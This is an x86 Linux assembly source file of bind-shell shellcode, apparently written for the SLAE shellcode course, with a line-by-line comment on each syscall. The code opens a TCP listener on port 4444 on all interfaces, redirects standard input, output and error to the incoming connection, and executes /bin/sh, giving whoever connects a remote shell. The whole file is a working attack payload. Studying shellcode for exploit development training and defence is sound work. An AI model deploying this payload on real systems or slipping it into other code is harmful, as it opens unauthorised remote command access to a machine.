; Filename: SLAEbindshell.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
;
; Purpose: 

global _start			

section .text
_start:

	xor eax, eax  		; Cleanup eax
	xor ebx, ebx  		; Cleanup ebx
	xor esi, esi  		; Cleanup esi
	xor edi, edi  		; Cleanup edi 
	mov al, 0x66  		; Set al to 0x66 (syscall for socketcall)
	mov bl, 0x1     	; Move 1 to bl, making ebx 1, sys_socket
	push esi      		; Push 0 to stack for arguments - TCP
	push ebx     		; Push 1 to stack for arguments - connection based byte stream
	push 0x2      		; Push 2 to stack for arguments - IP Protocol
	mov ecx, esp  		; Move stack to ecx for syscall
	int 0x80      		; Syscall sys_socket
	mov edi, eax  		; Move the socket file descriptor from syscall to edi
	
	xor eax, eax 		; Cleanup eax
	mov al, 0x66 		; Socketcall syscall
	inc ebx      		; Increment ebx form 1 to 2 (sys bind)
	push esi     		; Push 0 to stack, INADDR_ANY
	push word 0x5c11	; Push 4444 to stack, port for bind
	push bx			; Push 2 to stack, AF_INET
	mov ecx, esp		; Move args to ecx for sys call
	push 0x10		; addrlen=16
	push ecx		; arguments
	push edi		; Saved socket file descriptor from earlier
	mov ecx, esp		; Move args to ecx for sys call
	int 0x80		; Syscall sys_bind

	mov al, 0x66		; Syscall for socketcall
	mov bl, 0x4 		; sys_listen
	push esi		; Push 0 to stack, backlog=0
	push edi		; Saved socketfile decriptor from earlier
	mov ecx, esp		; Args from stack to ecx
	int 0x80		; Socketcall sys_listen

	mov al, 0x66		; socketcall
	inc bl			; Increment ebx to 5, sys_accept
	push esi		; addrlen=0
	push esi		; addr=0 Listen on all IPs
	push edi		; Saved socket file descriptor from earlier
	mov ecx, esp		; Args from stack
	int 0x80		; Socketcall sys_accept

	xor ecx, ecx		; Cleanup ECX
	mov cl, 0x2		; Set counter for loop
	mov ebx, eax		; Save client socket file descriptor from sys_accept
	xor eax, eax		; Cleanup EAX

loop:
	mov al, 0x3f		; Sys_dup2
	int 0x80		; Syscall sys_dup2, Setting stderr, stdout, and stdin to socket
	dec ecx			; Decrement ecx for loop and specifing stderr, stdout, stdin
	jns loop		

	xor eax, eax
	mov al, 0x0b		; Syscall - sys_execve
	xor edx, edx
	xor ecx, ecx
	push edx
	push 0x68732f2f 	; hs// 
	push 0x6e69622f		; nib/ pushing /bin/sh to stack, accounting for endianness
	mov ebx, esp		; Save args to ebx
	int 0x80		; final syscall, execve opening /bin/sh
